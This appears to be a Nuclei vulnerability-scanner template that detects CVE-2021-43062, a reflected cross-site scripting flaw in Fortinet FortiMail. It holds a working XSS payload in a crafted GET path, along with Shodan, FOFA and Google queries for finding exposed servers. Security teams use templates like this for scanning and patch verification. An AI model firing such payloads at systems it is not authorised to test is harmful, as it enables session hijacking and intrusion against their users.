http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <Svg/onload=alert(document.domain)>
    - FortiMail Click Protection
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/fmlurlsvc/?=&url=https%3A%2F%2Fgoogle.com<Svg%2Fonload%3Dalert(document.domain)>'
id: CVE-2021-43062
info:
  author: ajaysenr
  classification:
    cpe: cpe:2.3:a:fortinet:fortimail:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-43062
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.97717
    epss-score: 0.50211
  description: A cross-site scripting vulnerability in FortiMail may allow an unauthenticated
    attacker to perform an attack via specially crafted HTTP GET requests to the FortiGuard
    URI protection service.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary script code in the context of the targeted user''s browser,
    potentially leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    fofa-query:
    - title="fortimail"
    - fortimail && port=443
    google-query: intitle:"fortimail"
    max-request: 1
    product: fortimail
    shodan-query: http.title:"fortimail"
    vendor: fortinet
  name: Fortinet FortiMail 7.0.1 - Cross-Site Scripting
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-43062
  - https://www.fortiguard.com/psirt/FG-IR-21-185
  - https://www.exploit-db.com/exploits/50759
  - https://fortiguard.com/advisory/FG-IR-21-185
  - https://github.com/ARPSyndicate/cvemon
  remediation: 'Apply the latest security patch or upgrade to a non-vulnerable version
    of Fortinet FortiMail.

    '
  severity: medium
  tags: cve,cve2021,fortimail,xss,fortinet,edb,vuln
